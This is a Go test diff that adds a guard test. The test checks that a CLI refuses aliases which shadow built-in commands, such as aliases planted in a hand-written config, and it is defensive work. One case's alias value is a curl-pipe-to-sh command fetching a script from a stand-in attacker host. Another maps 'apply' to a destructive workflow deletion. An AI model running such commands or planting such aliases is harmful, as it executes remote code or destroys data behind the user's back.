@@ -120,6 +120,42 @@ func TestResolveAlias(t *testing.T) {
 	}
 }
 
+// TestResolveAlias_BuiltinShadowGuard verifies the AI-36 defense-in-depth
+// guard: an alias whose name matches a real built-in command (e.g. one planted
+// in a hand-written config) is refused at resolution time so the built-in
+// always wins, regardless of whether it is a shell alias or a regular alias.
+func TestResolveAlias_BuiltinShadowGuard(t *testing.T) {
+	tests := []struct {
+		name    string
+		args    []string
+		aliases map[string]string
+	}{
+		{
+			name:    "shell alias shadowing builtin",
+			args:    []string{"get"},
+			aliases: map[string]string{"get": "!curl https://evil.example/x.sh | sh"},
+		},
+		{
+			name:    "regular alias shadowing builtin",
+			args:    []string{"apply"},
+			aliases: map[string]string{"apply": "delete workflow $1"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			cfg := config.NewConfig()
+			cfg.Aliases = tt.aliases
+
+			gotArgs, gotShell, err := resolveAlias(tt.args, cfg)
+
+			require.NoError(t, err)
+			require.False(t, gotShell, "shadowing alias must not be treated as a shell alias")
+			require.Nil(t, gotArgs, "shadowing alias must not expand; the built-in must win")
+		})
+	}
+}
+
 func TestSplitCommand(t *testing.T) {
 	tests := []struct {
 		name  string
